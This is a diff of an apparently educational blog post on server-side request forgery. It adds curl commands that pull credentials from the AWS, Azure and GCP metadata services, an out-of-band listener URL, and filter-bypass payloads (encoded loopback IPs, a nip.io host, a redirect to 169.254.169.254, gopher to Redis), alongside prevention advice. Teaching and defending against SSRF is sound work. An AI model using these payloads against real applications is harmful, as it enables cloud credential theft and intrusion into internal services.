@@ -4,17 +4,17 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Server-Side Request Forgery (SSRF) — Satej Chaudhari</title>
-  <meta name="description" content="Making the server issue requests of your choosing — why fetch features are vulnerable, the implicit-trust targets (cloud metadata, internal panels, localhost), blind vs non-blind, why deny-lists fail, and allow-list/IMDSv2 defences.">
+  <meta name="description" content="Making the server issue requests of your choosing — where SSRF hides, the cloud-metadata prize (AWS/Azure/GCP IMDS commands), blind vs non-blind, the encodings and redirects that beat block-lists, and allow-list/IMDSv2 defences.">
   <meta property="og:type" content="article">
   <meta property="og:site_name" content="Satej Chaudhari">
   <meta property="og:title" content="Server-Side Request Forgery (SSRF)">
-  <meta property="og:description" content="Making the server issue requests of your choosing — why fetch features are vulnerable, the implicit-trust targets (cloud metadata, internal panels, localhost), blind vs non-blind, why deny-lists fail, and allow-list/IMDSv2 defences.">
+  <meta property="og:description" content="Making the server issue requests of your choosing — where SSRF hides, the cloud-metadata prize (AWS/Azure/GCP IMDS commands), blind vs non-blind, the encodings and redirects that beat block-lists, and allow-list/IMDSv2 defences.">
   <meta property="og:url" content="https://satejchaudhari.com/theory/2026-10-15-ssrf.html">
   <meta property="og:image" content="https://satejchaudhari.com/assets/img/og-default.png">
   <meta property="article:published_time" content="2026-10-15">
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="Server-Side Request Forgery (SSRF)">
-  <meta name="twitter:description" content="Making the server issue requests of your choosing — why fetch features are vulnerable, the implicit-trust targets (cloud metadata, internal panels, localhost), blind vs non-blind, why deny-lists fail, and allow-list/IMDSv2 defences.">
+  <meta name="twitter:description" content="Making the server issue requests of your choosing — where SSRF hides, the cloud-metadata prize (AWS/Azure/GCP IMDS commands), blind vs non-blind, the encodings and redirects that beat block-lists, and allow-list/IMDSv2 defences.">
   <meta name="twitter:image" content="https://satejchaudhari.com/assets/img/og-default.png">
 
   <link rel="icon" type="image/svg+xml" href="../assets/img/favicon.svg">
@@ -54,8 +54,6 @@
         <a href="../toolkit.html">Toolkit</a>
         <a href="../vulns.html">Vulns &amp; Misconfigs</a>
         <a href="../writeups.html">Writeups</a>
-        <a href="../maps.html">Maps</a>
-        <a href="../search.html">Search</a>
       </nav>
       <button class="theme-toggle" aria-label="Toggle light and dark theme" title="Toggle theme">
         <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
@@ -82,72 +80,93 @@
 
       <div class="post-body">
 
-<p>Server-Side Request Forgery (SSRF) is the bug that turns a web application
-into a proxy for the attacker. You make the <em>server</em> issue a request of
-your choosing, and because that request originates from inside the network, it
-reaches places you never could from outside: cloud metadata endpoints, internal
-admin panels, databases, and other services that trust "internal" traffic. In
-cloud environments SSRF is frequently the single step between a web bug and full
-account compromise.</p>
+<p>Server-Side Request Forgery (SSRF) turns a web application into a proxy for
+the attacker. You supply a URL; the <em>server</em> fetches it. Because that
+request now originates from inside the network, it reaches things you never
+could from the outside — cloud metadata services, internal admin panels,
+databases, and anything that trusts "internal" traffic. In cloud environments
+SSRF is often the single step between a web bug and full account takeover.</p>
 
-<h2>Why it exists</h2>
-<p>Any feature that fetches a URL on the user's behalf is a candidate: webhooks,
-link previews, PDF/image generators, document importers, "import from URL",
-SSO/OpenID discovery, and server-side HTTP clients. If the destination is taken
-from user input and the server does not restrict where it may connect, the user
-controls the server's outbound request.</p>
+<h2>Where it hides</h2>
+<p>Any feature that fetches a URL on your behalf is a candidate: webhooks, link
+previews, PDF and thumbnail generators, "import from URL", document converters,
+avatar-by-URL, and SSO/OpenID discovery. The tell is a parameter that holds a
+URL or hostname:</p>
+<pre><code>POST /api/pdf/render        {"url":"https://report.corp/x"}
+GET  /fetch?url=https://example.com/image.png
+POST /webhook   {"callback":"https://hooks.me/x"}</code></pre>
+<p>If the destination comes from input and the server does not restrict where it
+may connect, you control the server's outbound request.</p>
 
-<h2>What makes it dangerous: implicit trust</h2>
-<p>Internal services routinely skip authentication because they assume only
-trusted internal callers can reach them. SSRF breaks that assumption. The
-highest-impact target is the <strong>cloud instance metadata service</strong>
-(the link-local <code>169.254.169.254</code> address), which hands out the
-instance's IAM role credentials — see
-<a href="../cloud-map.html">the Cloud Attack Path Explorer</a> and
-<a href="2026-10-09-aws-attack-paths.html">AWS Attack Paths</a>. From there SSRF
-becomes privilege escalation into the cloud account.</p>
+<h2>The prize: cloud metadata</h2>
+<p>Internal services skip authentication because they assume only trusted
+callers can reach them — SSRF breaks that assumption. The highest-value target
+is the link-local <strong>instance metadata service (IMDS)</strong> on
+<code>169.254.169.254</code>, which hands out the instance's credentials. The
+exact request differs per provider:</p>
+<pre><code># AWS IMDSv1 (no token) — one request returns role creds
+curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role&gt;"
 
+# AWS IMDSv2 needs a PUT first — harder to reach via a GET-only SSRF
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
+curl -H "X-aws-ec2-metadata-token: $TOKEN" \
+  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+
+# Azure (header required) and GCP (header required)
+curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+curl -H "Metadata-Flavor: Google" \
+  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"</code></pre>
+<p>Recovered role credentials feed straight into the
+<a href="../cloud-map.html">Cloud Attack Path Explorer</a> and
+<a href="2026-10-09-aws-attack-paths.html">AWS Attack Paths</a>.</p>
+
+<h2>Blind vs. non-blind</h2>
+<p>If the fetched response is reflected back to you, SSRF is <strong>non-blind</strong>
+and you read internal content directly. If nothing comes back, it is
+<strong>blind</strong>: confirm it out-of-band by pointing the server at a
+listener you control, and exploit it through side effects.</p>
+<pre><code># confirm blind SSRF with an OOB listener (Burp Collaborator / your own host)
+?url=http://YOUR-COLLABORATOR-ID.oast.site/     # a DNS+HTTP hit confirms the fetch</code></pre>
+
+<h2>Why block-lists fail</h2>
+<p>Naive defences string-match <code>localhost</code> or
+<code>169.254.169.254</code>. These fall to alternate encodings and redirects,
+which is why a block-list is the wrong control:</p>
+<pre><code>http://127.0.0.1        http://127.1          http://0            http://[::1]
+http://2130706433/      # decimal 127.0.0.1   http://0x7f.0x0.0x0.0x1
+http://169.254.169.254.nip.io/      # DNS name that resolves to the target
+http://allowed-host/redirect?to=http://169.254.169.254/   # 302 to the real target
+gopher://127.0.0.1:6379/_&lt;redis-protocol&gt;   # reach non-HTTP services</code></pre>
+
+<h2>Impact</h2>
 <table>
-  <thead><tr><th>SSRF target</th><th>Payoff</th></tr></thead>
+  <thead><tr><th>Target reached</th><th>Result</th></tr></thead>
   <tbody>
-    <tr><td>Cloud metadata (169.254.169.254)</td><td>IAM role credentials → cloud account access</td></tr>
-    <tr><td>Internal admin panels / dashboards</td><td>Unauthenticated management access</td></tr>
-    <tr><td>Internal APIs &amp; databases</td><td>Data access, further pivot</td></tr>
-    <tr><td>localhost services</td><td>Debug endpoints, actuators, unauth daemons</td></tr>
+    <tr><td>Cloud metadata (169.254.169.254)</td><td>Role/SA credentials → cloud account access</td></tr>
+    <tr><td>Internal admin panel / dashboard</td><td>Unauthenticated management access</td></tr>
+    <tr><td>Internal API or database</td><td>Data access, further pivot</td></tr>
+    <tr><td>localhost / gopher to a daemon</td><td>Debug endpoints, actuators, Redis/other unauth services</td></tr>
   </tbody>
 </table>
 
-<h2>Blind vs non-blind</h2>
-<p>If the response comes back to you, SSRF is <strong>non-blind</strong> and you
-can read internal content directly. If it does not, it is <strong>blind</strong>
-— you confirm it out-of-band (the server connects to a collaborator host you
-control) and exploit it through side effects and timing. Blind SSRF is still
-dangerous: it is enough to hit the metadata endpoint or trigger internal
-state-changing requests.</p>
-
-<h2>Why filters fail</h2>
-<p>Naive defences block <code>localhost</code> or <code>169.254.169.254</code>
-by string match. These are routinely bypassed with alternative encodings,
-alternate IP representations, DNS names that resolve to internal addresses, and
-redirect chains where an allowed host 302s to an internal one. The lesson is
-that <em>deny-lists do not work for SSRF</em>; the destination must be validated
-positively.</p>
-
-<h2>Detection &amp; prevention</h2>
+<h2>Prevention</h2>
 <ul>
-  <li><strong>Allow-list destinations:</strong> validate the resolved IP against
-      an explicit allow-list after DNS resolution, and re-validate on redirects.</li>
-  <li><strong>Block link-local and internal ranges</strong> at the egress layer;
-      put fetchers in a segmented network with no route to metadata or admin.</li>
-  <li><strong>Enforce IMDSv2</strong> (session-token metadata) so a simple SSRF
-      cannot read instance credentials.</li>
-  <li><strong>Disable unused URL schemes</strong> (file://, gopher://, dict://)
-      and cap response size/redirects.</li>
-  <li><strong>Detection:</strong> outbound requests from app servers to
-      link-local/internal addresses, and fetches to unexpected hosts.</li>
+  <li><strong>Allow-list, don't block-list.</strong> Resolve the hostname, check
+      the resulting IP against an explicit allow-list, and re-validate after every
+      redirect (so a 302 to an internal IP is caught).</li>
+  <li><strong>Block link-local and private ranges at egress</strong> and run
+      fetchers in a segment with no route to metadata or admin.</li>
+  <li><strong>Enforce IMDSv2</strong> so a simple GET-only SSRF cannot read
+      credentials.</li>
+  <li><strong>Disable unused schemes</strong> (<code>file://</code>,
+      <code>gopher://</code>, <code>dict://</code>) and cap response size and
+      redirect count.</li>
+  <li><strong>Detect</strong> outbound requests from app servers to link-local or
+      internal addresses — they should essentially never happen.</li>
 </ul>
-<p>Full testing detail is in the
-<a href="../vuln-detail.html?vuln=ssrf">SSRF vuln entry</a>.</p>
+<p>Testing steps are in the <a href="../vuln-detail.html?vuln=ssrf">SSRF vuln entry</a>.</p>
 
 <h2>Related reading</h2>
 <ul class="related-list">
